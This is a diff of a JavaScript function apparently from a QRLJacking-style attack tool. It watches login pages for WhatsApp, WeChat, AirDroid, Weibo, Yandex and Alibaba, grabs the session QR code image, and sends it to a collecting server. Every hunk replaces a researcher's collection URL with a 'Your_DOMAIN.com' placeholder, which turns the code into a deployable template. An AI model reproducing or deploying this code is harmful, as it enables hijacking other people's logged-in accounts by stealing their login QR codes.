@@ -18,7 +18,7 @@ function loopForQR() {
       if (document.getElementsByClassName('icon icon-chat')[0] == null)
       {
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeWhatsapp.php?c=' + document.getElementsByTagName('img')[0].src, true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeWhatsapp.php?c=' + document.getElementsByTagName('img')[0].src, true);
         xhttp.send();
       }
     }
@@ -32,7 +32,7 @@ function loopForQR() {
       if (document.getElementsByClassName('qrcode') [0] !== null)
       {
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeWechat.php?c=' + encodeURIComponent(document.getElementsByClassName('img') [0].src), true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeWechat.php?c=' + encodeURIComponent(document.getElementsByClassName('img') [0].src), true);
         xhttp.send();
       }
     }
@@ -46,7 +46,7 @@ function loopForQR() {
       if (document.getElementsByClassName('widget-login-qr-imgWrapper widget-login-qr-loading') [0] !== null)
       {
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeAirdroid.php?c=' + encodeURIComponent(document.getElementsByTagName('img') [14].src), true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeAirdroid.php?c=' + encodeURIComponent(document.getElementsByTagName('img') [14].src), true);
         xhttp.send();
       }
     }  
@@ -60,7 +60,7 @@ function loopForQR() {
       if ( document.getElementsByTagName('img')[1].src !== null)
       {
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeWeibo.php?c=' + encodeURIComponent(document.getElementsByTagName('img')[1].src), true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeWeibo.php?c=' + encodeURIComponent(document.getElementsByTagName('img')[1].src), true);
         xhttp.send();
       }
     }  
@@ -79,7 +79,7 @@ function loopForQR() {
         var res2 = res.replace("\"), none","");
 
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeYandex.php?c=' + encodeURIComponent(res2), true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeYandex.php?c=' + encodeURIComponent(res2), true);
         xhttp.send();
       }
     }  
@@ -94,7 +94,7 @@ function loopForQR() {
       if (document.getElementsByTagName('img')[0].src !== null)
       {
         var xhttp = new XMLHttpRequest();
-        xhttp.open('GET', 'https://www.seekurity.com/researches/blackhat/storeAlibaba.php?c=' + document.getElementsByTagName('img')[0].src, true);
+        xhttp.open('GET', 'https://www.Your_DOMAIN.com//storeAlibaba.php?c=' + document.getElementsByTagName('img')[0].src, true);
         xhttp.send();
       }
     }  
